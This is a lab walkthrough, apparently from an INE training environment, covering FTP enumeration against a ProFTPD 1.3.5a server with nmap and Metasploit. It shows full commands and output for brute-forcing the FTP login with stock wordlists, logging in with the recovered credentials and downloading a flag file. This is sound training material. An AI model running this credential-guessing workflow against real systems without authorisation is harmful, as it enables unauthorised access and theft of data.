# FTP Enumeration

### Objective:
perform FTP enumeration with Metasploit

### Target:
`demo.ine.local`

---
First we do a simple nmap scan on the target, followed by a **service** scan for the **ftp** port.
```bash
┌──(root㉿INE)-[~]
└─# nmap -Pn demo.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-10 00:01 IST
Nmap scan report for demo.ine.local (192.205.16.3)
Host is up (0.000027s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
MAC Address: 02:42:C0:CD:10:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds

┌──(root㉿INE)-[~]
└─# nmap -Pn -sV -p21 demo.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-10 00:01 IST
Nmap scan report for demo.ine.local (192.205.16.3)
Host is up (0.000046s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5a
MAC Address: 02:42:C0:CD:10:03 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds
```
Next we start the **postgresql** database and boot up **msf**. We set up a new workspace and look for modules related to **ftp**.
```bash
+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > workspace -a ftp_lab
[*] Added workspace: ftp_lab
[*] Workspace: ftp_lab
msf6 > workspace
  default
* ftp_lab
msf6 > search type:auxiliary name:ftp

Matching Modules
```
First we try to find the **ftp** version. We use the auxiliary module for this, set up a global **RHOSTS** as `192.205.16.3` and run the module.
```bash
msf6 auxiliary(scanner/ftp/ftp_version) > show options

Module options (auxiliary/scanner/ftp/ftp_version):

   Name     Current Setting      Required  Description
   ----     ---------------      --------  -----------
   FTPPASS  mozilla@example.com  no        The password for the specified username
   FTPUSER  anonymous            no        The username to authenticate as
   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21                   yes       The target port (TCP)
   THREADS  1                    yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/ftp/ftp_version) > setg RHOSTS 192.205.16.3
RHOSTS => 192.205.16.3
msf6 auxiliary(scanner/ftp/ftp_version) > r
[-] Unknown command: r. Run the help command for more details.
msf6 auxiliary(scanner/ftp/ftp_version) > run

[+] 192.205.16.3:21       - FTP Banner: '220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.205.16.3]\x0d\x0a'
[*] 192.205.16.3:21       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ftp/ftp_version) > 
```
Next we try to bruteforce the password using **ftp_login** auxiliary module. We set the **USER_FILE** and the **PASS_FILE** from **msf** wordlists.
```bash
msf6 auxiliary(scanner/ftp/ftp_login) > show options

Module options (auxiliary/scanner/ftp/ftp_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   ANONYMOUS_LOGIN   false            yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST      false            no        Record anonymous/guest logins to the database
   RHOSTS            192.205.16.3     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT             21               yes       The target port (TCP)
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/ftp/ftp_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
USER_FILE => /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf6 auxiliary(scanner/ftp/ftp_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
PASS_FILE => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```
Once this is set we just run the module.
```bash
msf6 auxiliary(scanner/ftp/ftp_login) > run

[*] 192.205.16.3:21       - 192.205.16.3:21 - Starting FTP login sweep
[-] 192.205.16.3:21       - 192.205.16.3:21 - LOGIN FAILED: sysadmin:admin (Incorrect: )
[-] 192.205.16.3:21       - 192.205.16.3:21 - LOGIN FAILED: sysadmin:123456 (Incorrect: )
[-] 192.205.16.3:21       - 192.205.16.3:21 - LOGIN FAILED: sysadmin:12345 (Incorrect: )
[-] 192.205.16.3:21       - 192.205.16.3:21 - LOGIN FAILED: sysadmin:123456789 (Incorrect: )
[-] 192.205.16.3:21       - 192.205.16.3:21 - LOGIN FAILED: sysadmin:password (Incorrect: )
[-] 192.205.16.3:21       - 192.205.16.3:21 - LOGIN FAILED: sysadmin:iloveyou (Incorrect: )
[-] 192.205.16.3:21       - 192.205.16.3:21 - LOGIN FAILED: sysadmin:princess (Incorrect: )
[-] 192.205.16.3:21       - 192.205.16.3:21 - LOGIN FAILED: sysadmin:1234567 (Incorrect: )
[-] 192.205.16.3:21       - 192.205.16.3:21 - LOGIN FAILED: sysadmin:12345678 (Incorrect: )
[-] 192.205.16.3:21       - 192.205.16.3:21 - LOGIN FAILED: sysadmin:abc123 (Incorrect: )
[-] 192.205.16.3:21       - 192.205.16.3:21 - LOGIN FAILED: sysadmin:nicole (Incorrect: )
[-] 192.205.16.3:21       - 192.205.16.3:21 - LOGIN FAILED: sysadmin:daniel (Incorrect: )
[-] 192.205.16.3:21       - 192.205.16.3:21 - LOGIN FAILED: sysadmin:babygirl (Incorrect: )
[-] 192.205.16.3:21       - 192.205.16.3:21 - LOGIN FAILED: sysadmin:monkey (Incorrect: )
[-] 192.205.16.3:21       - 192.205.16.3:21 - LOGIN FAILED: sysadmin:lovely (Incorrect: )
[-] 192.205.16.3:21       - 192.205.16.3:21 - LOGIN FAILED: sysadmin:jessica (Incorrect: )
[+] 192.205.16.3:21       - 192.205.16.3:21 - Login Successful: sysadmin:654321
```
We have found a successful password. Next we can try to login into the ftp server with the credentials found.
```bash
┌──(root㉿INE)-[~]
└─# ftp sysadmin@demo.ine.local
Connected to demo.ine.local.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.205.16.3]
331 Password required for sysadmin
Password: 
230 User sysadmin logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||34471|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0              33 Nov 20  2018 secret.txt
226 Transfer complete
ftp> get secret.txt
local: secret.txt remote: secret.txt
229 Entering Extended Passive Mode (|||5275|)
150 Opening BINARY mode data connection for secret.txt (33 bytes)
100% |**********************************************************************************************************************************************************************************************|    33      264.15 KiB/s    00:00 ETA
226 Transfer complete
33 bytes received in 00:00 (36.70 KiB/s)
ftp> exit
221 Goodbye.
                  
┌──(root㉿INE)-[~]                                                                                                                                                                                                                         
└─# cat secret.txt                                                                                                                                                                                                                         
260ca9dd8a4577fc00b7bd5810298076  
```